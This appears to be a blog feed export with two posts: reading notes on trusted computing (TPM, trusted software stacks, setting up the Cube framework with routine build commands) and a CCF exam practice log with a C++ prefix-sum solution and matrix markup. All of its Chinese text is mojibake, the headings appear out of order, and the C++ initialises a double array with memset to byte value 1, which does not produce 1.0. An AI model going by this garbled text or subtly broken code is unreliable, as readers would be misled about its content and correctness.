Trustï¼Œ<code>RoT</code>ï¼‰æ˜¯æœ€åŸºç¡€çš„å¯ä¿¡éƒ¨ä»¶ï¼Œæ˜¯ç³»ç»Ÿå¯ä¿¡çš„æºå¤´ï¼Œæ—¢å…·å¤‡å®‰å…¨åŠŸèƒ½åˆå…·å¤‡å¯ä¿¡åŠŸèƒ½ï¼Œä¸”ä¸éœ€è¦å…¶ä»–æœºåˆ¶æä¾›å®‰å…¨æ”¯æ’‘çš„åº•å±‚æœºåˆ¶ã€‚åœ¨é™¤å¯ä¿¡3.0å¤–çš„å¯ä¿¡æ¡†æ¶ä¸­ï¼Œå¯ä¿¡æ ¹ä»¥å¯ä¿¡å¹³å°æ¨¡å—(Trusted Platform Moduleï¼Œ<code>TPM</code>)ä¸ºåŸºç¡€ã€‚</p></li><li><p>å¯ä¿¡å¹³å°ï¼ˆTrusted Platformï¼Œ<code>TP</code>ï¼‰æ˜¯å®ç°å¯ä¿¡è®¡ç®—åŠŸèƒ½çš„è®¾å¤‡æˆ–ç³»ç»Ÿã€‚</p></li><li><p>å¯ä¿¡è½¯ä»¶æ ˆï¼ˆTrusted Software Stack, <code>TSS</code>ï¼‰æ˜¯å¯ä¿¡è®¡ç®—ä½“ç³»ä¸­çš„ä¸€ç»„è½¯ä»¶æ¥å£å’Œå·¥å…·ï¼Œå®ƒå°†å¯ä¿¡ç¡¬ä»¶ï¼ˆå¦‚<code>TPM</code>ï¼‰çš„åŠŸèƒ½æš´éœ²ç»™æ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºï¼Œä»¥ä¾¿å®ƒä»¬èƒ½å¤Ÿè°ƒç”¨å’Œç®¡ç†è¿™äº›åŠŸèƒ½ã€‚</p></li><li><p>å¯ä¿¡ç½‘ç»œè¿æ¥ï¼ˆTrusted Network Connection, <code>TNC</code>ï¼‰æ˜¯ä¸€ç§ç½‘ç»œå®‰å…¨æ¡†æ¶ï¼Œæ—¨åœ¨ç¡®ä¿åªæœ‰ç»è¿‡å¯ä¿¡éªŒè¯çš„è®¾å¤‡å’Œç³»ç»Ÿæ‰èƒ½æ¥å…¥ç½‘ç»œï¼Œé˜²æ­¢ä¸å—ä¿¡ä»»æˆ–è¢«æ”»é™·çš„è®¾å¤‡å¨èƒç½‘ç»œå®‰å…¨ã€‚</p></li></ul><p>åµŒæœ‰<code>TPM</code>çš„å¹³å°è¢«ç§°ä½œå¯ä¿¡è®¡ç®—å¹³å°ã€‚</p><p><strong>å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆ<code>TPM</code>ï¼‰</strong></p><p><code>TPM</code>é€šè¿‡å¯ä¿¡è½¯ä»¶æ ˆï¼ˆ<code>TSS</code>ï¼‰ä¸ºå¯ä¿¡è®¡ç®—å¹³å°ä¸Šçš„åº”ç”¨ç¨‹åºæä¾›å®Œæ•´æ€§åº¦é‡ã€å­˜å‚¨å’ŒæŠ¥å‘Šï¼Œè¿œç¨‹è¯æ˜ï¼Œæ•°æ®ä¿æŠ¤å’Œå¯†é’¥ç®¡ç†4å¤§æ ¸å¿ƒåŠŸèƒ½ã€‚</p><h2 id="å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTPMï¼‰-2">å¯ä¿¡å¹³å°æ¨¡å—ï¼ˆTPMï¼‰</h2><h3 id="æ¦‚è¿°">æ¦‚è¿°</h3><h1 id="å¯ä¿¡è®¡ç®—å·¥ç¨‹åˆæ­¥">å¯ä¿¡è®¡ç®—å·¥ç¨‹åˆæ­¥</h1><p>æœ¬ç« ä¸ºé˜…è¯»ã€Šå¯ä¿¡è®¡ç®—3.0å·¥ç¨‹åˆæ­¥ï¼ˆç¬¬äºŒç‰ˆï¼‰ã€‹çš„é˜…è¯»ç¬”è®°ã€‚</p><h2 id="æ¦‚è¿°-2">æ¦‚è¿°</h2><h3 id="ä»€ä¹ˆæ˜¯å¯ä¿¡è®¡ç®—">ä»€ä¹ˆæ˜¯å¯ä¿¡è®¡ç®—</h3><h3 id="å¯ä¿¡è®¡ç®—å‘å±•è¿‡ç¨‹">å¯ä¿¡è®¡ç®—å‘å±•è¿‡ç¨‹</h3><h4 id="å¯ä¿¡3-0çš„åº”ç”¨æ¨¡å¼">å¯ä¿¡3.0çš„åº”ç”¨æ¨¡å¼</h4><h4 id="å¯ä¿¡æœºåˆ¶">å¯ä¿¡æœºåˆ¶</h4><h4 id="å¯ä¿¡ç­–ç•¥">å¯ä¿¡ç­–ç•¥</h4><h4 id="å¯ä¿¡ä¿éšœ">å¯ä¿¡ä¿éšœ</h4><h2 id="å¯ä¿¡è®¡ç®—åŸºæœ¬æ¦‚å¿µ">å¯ä¿¡è®¡ç®—åŸºæœ¬æ¦‚å¿µ</h2><h3 id="å¯ä¿¡æ ¹å’Œå¯ä¿¡é“¾">å¯ä¿¡æ ¹å’Œå¯ä¿¡é“¾</h3><h4 id="å¯ä¿¡æ ¹">å¯ä¿¡æ ¹</h4><h4 id="å¯ä¿¡é“¾">å¯ä¿¡é“¾</h4><h3 id="å¯ä¿¡å¯†ç æœåŠ¡">å¯ä¿¡å¯†ç æœåŠ¡</h3><h4 id="å¯ä¿¡å­˜å‚¨">å¯ä¿¡å­˜å‚¨</h4><h4 id="å¯ä¿¡åº¦é‡">å¯ä¿¡åº¦é‡</h4><h4 id="å¯ä¿¡æŠ¥å‘Šå’Œå¯ä¿¡è®¤è¯">å¯ä¿¡æŠ¥å‘Šå’Œå¯ä¿¡è®¤è¯</h4><h3 id="å¯ä¿¡éƒ¨ä»¶">å¯ä¿¡éƒ¨ä»¶</h3><h4 id="å¯ä¿¡å¯†ç æ¨¡å—ï¼ˆTCMï¼‰-2">å¯ä¿¡å¯†ç æ¨¡å—ï¼ˆTCMï¼‰</h4><h4 id="å¯ä¿¡å¹³å°æ§åˆ¶èŠ¯ç‰‡ï¼ˆTPCMï¼‰">å¯ä¿¡å¹³å°æ§åˆ¶èŠ¯ç‰‡ï¼ˆTPCMï¼‰</h4><h4 id="å¯ä¿¡ä¸»æ¿">å¯ä¿¡ä¸»æ¿</h4><h4 id="å¯ä¿¡è½¯ä»¶åŸº">å¯ä¿¡è½¯ä»¶åŸº</h4><h4 id="å¯ä¿¡ç½‘ç»œè¿æ¥">å¯ä¿¡ç½‘ç»œè¿æ¥</h4><h3 id="å¯ä¿¡ä½“ç³»æ¶æ„">å¯ä¿¡ä½“ç³»æ¶æ„</h3><h2 id="å¯ä¿¡è½¯ä»¶åŸºæ¡†æ¶åŸå‹Cube">å¯ä¿¡è½¯ä»¶åŸºæ¡†æ¶åŸå‹Cube</h2><h3 id="Cubeä»‹ç»">Cubeä»‹ç»</h3><h3 id="å¼€å‘æµç¨‹">å¼€å‘æµç¨‹</h3><h3 id="Cubeå®ä¾‹">Cubeå®ä¾‹</h3><h4 id="Linuxç¯å¢ƒå‡†å¤‡">Linuxç¯å¢ƒå‡†å¤‡</h4><p>Ubuntu16.04</p><p>è°ƒè¯•å·¥å…·gbd</p><p>gccã€makeç­‰å·¥å…·åŒ…</p><h4 id="CubeåŸºæœ¬ç¯å¢ƒç¼–è¾‘">CubeåŸºæœ¬ç¯å¢ƒç¼–è¾‘</h4><p>ä¸‹è½½Cube</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/biparadox/cube-1.3<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæŒ‡ä»¤æ— æ³•æˆåŠŸä¸‹è½½ï¼ŒåŸå› æš‚æœªçŸ¥ï¼Œç›´æ¥ä»å®˜ç½‘ä¸‹å‹ç¼©æ–‡ä»¶ç„¶åè§£å‹å§</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">unzip cube-1.3-master.zip -d cube<br><span class="hljs-built_in">mv</span> cube/cube-1.3-master cube-1.3<br><span class="hljs-built_in">rm</span> -rf cube<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹æ–‡ä»¶å¤¹å†…éƒ¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cube-1.3/<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241121150949203.png" alt="image-20241121150949203"></p><p>å…¶ä¸­set_env.shå’Œenv_build.shä¸ºç¯å¢ƒå˜é‡è®¾ç½®å’Œç¼–è¯‘è„šæœ¬ï¼Œ<br>cubelibä¸ºcubeæ¶æ„å†…éƒ¨åº“çš„æºç ç›®å½•ï¼Œ<br>procç›®å½•ä¸‹ä¸ºcubeæ¶æ„çš„ä¸»ç¨‹åºå’Œä¸€ç»„é€šç”¨æ¨¡å—çš„æºç ï¼Œ<br>includeä¸ºæ¨¡å—å¼€å‘æ—¶å¯ä½¿ç”¨çš„åº“å‡½æ•°åˆ—è¡¨ï¼Œ<br>exampleç›®å½•ä¸‹åˆ™æ˜¯ç¤ºä¾‹å®ä¾‹ã€‚</p><p>ç¯å¢ƒå˜é‡é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi set_env.sh<br></code></pre></td></tr></table></figure><p>æ­¤å¤„æ”¹æˆset_env.shæ‰€åœ¨ä½ç½®ï¼Œæ³¨æ„éœ€è¦å»æ‰å¼•å·</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123193206034.png" alt="image-20241123193206034"></p><p>éšåæ‰§è¡Œsource set_env.shå‘½ä»¤,å®Œæˆç¼–è¯‘ç¯å¢ƒè®¾ç½®ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123194329813.png" alt="image-20241123194329813"></p><p>ä½¿ç”¨å‘½ä»¤æŸ¥çœ‹ç³»ç»Ÿä¸­Cubeç¯å¢ƒç›¸å…³å˜é‡çš„é…ç½®æƒ…å†µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span>| grep CUBE<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123195730480.png" alt="image-20241123195730480"></p><p>ç³»ç»Ÿæ¯æ¬¡è¿›å…¥å¼€å‘ç¯å¢ƒéƒ½éœ€è¦æ‰§è¡Œæœ¬è„šæœ¬ï¼Œå¯ä»¥åœ¨ç”¨æˆ·ç›®å½•çš„.bashrcæ–‡ä»¶æœ€åæ·»åŠ å¦‚ä¸‹å‘½ä»¤ï¼Œä»¥ä½¿å…¶æ¯æ¬¡éƒ½èƒ½è‡ªåŠ¨å®Œæˆè®¾ç½®ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> /home/syz/cube-1.3/set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123195415284.png" alt="image-20241123195415284"></p><p>ç¼–è¯‘Cubeçš„åŸºæœ¬åº“å‡½æ•°</p><p>è¿›å…¥cube-1.3ç›®å½•ä¸‹çš„cubelibç›®å½•ï¼Œæ‰§è¡ŒlsæŸ¥çœ‹ï¼Œå¹¶åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œmakeã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> cubelib<br><span class="hljs-built_in">ls</span><br>make<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200030913.png" alt="image-20241123200030913"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200130468.png" alt="image-20241123200130468"></p><p>ç¼–è¯‘æˆåŠŸåï¼Œè¿›å…¥procç›®å½•ä¸‹ã€‚proc ç›®å½•åŒ…å«Cube çš„ä¸»ç¨‹åºã€ç³»ç»Ÿå­å—ã€ä¸€äº›ç¤ºä¾‹å­æ¨¡å—ä¸å¸¸ç”¨çš„åŠŸèƒ½å­æ¨¡å—ã€‚æ‰§è¡Œlså‘½ä»¤æŸ¥çœ‹ï¼Œå¯çœ‹åˆ°å¦‚ä¸‹ç»“æœã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200853407.png" alt="image-20241123200853407"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123200918741.png" alt="image-20241123200918741"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201021009.png" alt="image-20241123201021009"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201108286.png" alt="image-20241123201108286"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201156318.png" alt="image-20241123201156318"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201628927.png" alt="image-20241123201628927"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201713814.png" alt="image-20241123201713814"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> dmidecode | grep UUID<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201258216.png" alt="image-20241123201258216"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201447471.png" alt="image-20241123201447471"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201833053.png" alt="image-20241123201833053"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123201914784.png" alt="image-20241123201914784"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> cube_audit.log<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241123202056503.png" alt="image-20241123202056503"></p><h3 id="æœ€ç®€å•çš„Cubeå®ä¾‹">æœ€ç®€å•çš„Cubeå®ä¾‹</h3>]]></content>
    
    
    
    <tags>
      
      <tag>å¯ä¿¡è®¡ç®—</tag>
      
      <tag>TPM</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ccfåˆ·é¢˜è®°å½•</title>
    <link href="/2024/03/21/ccf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/03/21/ccf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="2023å¹´">2023å¹´</h1><h2 id="202309-2-åæ ‡å˜æ¢ï¼ˆå…¶äºŒï¼‰">202309-2 åæ ‡å˜æ¢ï¼ˆå…¶äºŒï¼‰</h2><p>è¿™ä¸ªé¢˜ç›®å‰80åˆ†ä¸éš¾æ‹¿ï¼Œæ•°æ®é‡ä¹Ÿæ¯”è¾ƒå°ï¼Œåé¢äºŒååˆ†çš„æ•°æ®ä¼šæ¯”è¾ƒå¤šã€‚</p><p>æˆ‘æœ€å¼€å§‹å°±åªæ˜¯ç”¨æš´åŠ›å°±å†™äº†ï¼Œç”¨ä¿©æ•°ç»„å­˜æ“ä½œå’Œæ•°æ®ï¼Œç„¶åæ¯è½®éå†æ“ä½œï¼Œåˆ†æƒ…å†µè®¡ç®—ç»“æœå³å¯ã€‚ä½†æ˜¯è¿™æ ·è¿‡ä¸äº†å¦å¤–çš„20%ï¼Œä¹‹åæƒ³åˆ°äº†æˆ–è®¸èƒ½ç”¨å‰ç¼€å’Œï¼Œä¸€ä¸²ç›¸åŒæ“ä½œçš„æ•°æ®å°±ç»™ç¼–å†™åˆ°å‰ç¼€å’Œé‡Œï¼Œæˆ‘ä¸€å¼€å§‹ä»¥ä¸ºæ“ä½œçš„å…ˆåé¡ºåºä¼šå½±å“åˆ°ç»“æœï¼Œæ‰€ä»¥ä»¥ä¸ºå¿…é¡»è¦çŸ¥é“å‰ç¼€å’Œçš„é•¿åº¦æ˜¯ä»å“ªåˆ°å“ªï¼Œæ‰€ä»¥ä¹Ÿæ²¡å†™å‡ºæ¥ï¼Œä½†æ˜¯ä¹‹åå‘ç°è™½ç„¶è®¡ç®—çš„é¡ºåºç¡®å®ä¸ä¸€æ ·äº†ï¼Œä½†æ˜¯é€»è¾‘ä¸Šè®²ç»“æœæ˜¯ä¸€æ ·çš„ï¼Œå› æ­¤è¿˜æ˜¯å¯ä»¥ä½¿ç”¨å‰ç¼€å’Œçš„ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> n,m;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;n,&amp;m);<br>    <span class="hljs-type">int</span> op;<br>    <span class="hljs-type">double</span> k[<span class="hljs-number">100010</span>],tangle[<span class="hljs-number">100010</span>],data;<br>    <span class="hljs-built_in">memset</span>(k,<span class="hljs-number">1</span>,<span class="hljs-built_in">sizeof</span>(k));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %lf&quot;</span>,&amp;op,&amp;data);<br>        <span class="hljs-keyword">if</span>(op==<span class="hljs-number">2</span>)<br>        &#123;<br>            tangle[i]=tangle[i<span class="hljs-number">-1</span>]+data;<br>            k[i]=k[i<span class="hljs-number">-1</span>];<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            k[i]=k[i<span class="hljs-number">-1</span>]*data;<br>            tangle[i]=tangle[i<span class="hljs-number">-1</span>];<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> i,j;<br>    <span class="hljs-type">double</span> x,y;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> b = <span class="hljs-number">0</span>; b &lt; m; b++)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d %lf %lf&quot;</span>,&amp;i,&amp;j,&amp;x,&amp;y);<br>        <span class="hljs-type">double</span> k_m=k[j]/k[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-type">double</span> tangle_m=tangle[j]-tangle[i<span class="hljs-number">-1</span>];<br>        <span class="hljs-type">double</span> xx=(x*<span class="hljs-built_in">cos</span>(tangle_m)-y*<span class="hljs-built_in">sin</span>(tangle_m))*k_m;<br>        <span class="hljs-type">double</span> yy=(x*<span class="hljs-built_in">sin</span>(tangle_m)+y*<span class="hljs-built_in">cos</span>(tangle_m))*k_m;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.3f %.3f\n&quot;</span>,xx,yy);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="202305-2-çŸ©é˜µè¿ç®—">202305-2 çŸ©é˜µè¿ç®—</h2><p>è¿™é“é¢˜éœ€è¦äº†è§£çŸ©é˜µçš„å‡ ä¸ªåŸºæœ¬è¿ç®—åˆ†åˆ«æ€ä¹ˆè®¡ç®—çš„ï¼Œä»¥åŠçŸ©é˜µçš„è½¬ç½®æ˜¯ä»€ä¹ˆã€‚</p><p>é¦–å…ˆè¯´çŸ©é˜µçš„è½¬ç½®ï¼Œå…¶å®å°±æ˜¯æŠŠä¸€ä¸ªnxmçš„çŸ©é˜µè½¬æ¢æˆmxnçš„çŸ©é˜µä¸¾ä¸ªä¾‹å­</p><p>å·¦è¾¹åŸæœ¬æ˜¯2x3çš„çŸ©é˜µï¼Œè½¬ç½®åæˆäº†å³è¾¹3x2çš„çŸ©é˜µ</p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><msup><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow><mo>âŠº</mo></msup><mo>=</mo><mrow><mo fence="true">(</mo><mtable rowspacing="0.16em" columnalign="center center" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>5</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>3</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>6</mn></mstyle></mtd></mtr></mtable><mo fence="true">)</mo></mrow></mrow></mstyle></mtd></mtr></mtable><annotation encoding="application/x-tex">\begin{array}{cc}\begin{pmatrix}    1 &amp; 2 &amp; 3 \\    4 &amp; 5 &amp; 6 \\\end{pmatrix}^\intercal=\begin{pmatrix}    1 &amp; 4 \\    2 &amp; 5 \\    3 &amp; 6\end{pmatrix}\end{array}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6em;vertical-align:-1.55em;"></span><span class="mord"><span class="mtable"><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:4.05em;"></span><span class="mord"><span class="minner"><span class="minner"><span class="mopen delimcenter" style="top:0em;"><span class="delimsizing size3">(</span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span><span style="top:-2.41em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.95em;"><span></span></span></span></span></span></span></span><span class="mclose delimcenter" style="top:0em;"><span class="delimsizing size3">)</span></span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:1.5043em;"><span style="top:-3.9029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin amsrm mtight">âŠº</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path d="M863,9c0,-2,-2,-5,-6,-9c0,0,-17,0,-17,0c-12.7,0,-19.3,0.3,-20,1c-5.3,5.3,-10.3,11,-15,17c-242.7,294.7,-395.3,682,-458,1162c-21.3,163.3,-33.3,349,-36,557 l0,84c0.2,6,0,26,0,60c2,159.3,10,310.7,24,454c53.3,528,210,949.7,470,1265c4.7,6,9.7,11.7,15,17c0.7,0.7,7,1,19,1c0,0,18,0,18,0c4,-4,6,-7,6,-9c0,-2.7,-3.3,-8.7,-10,-18c-135.3,-192.7,-235.5,-414.3,-300.5,-665c-65,-250.7,-102.5,-544.7,-112.5,-882c-2,-104,-3,-167,-3,-189l0,-92c0,-162.7,5.7,-314,17,-454c20.7,-272,63.7,-513,129,-723c65.3,-210,155.3,-396.3,270,-559c6.7,-9.3,10,-15.3,10,-18z"/></svg></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span><span style="top:-3.01em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">5</span></span></span><span style="top:-1.81em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">6</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:1.55em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.05em;"><span class="pstrut" style="height:5.6em;"></span><span style="width:0.875em;height:3.600em;"><svg xmlns="http://www.w3.org/2000/svg" width="0.875em" height="3.600em" viewBox="0 0 875 3600"><path 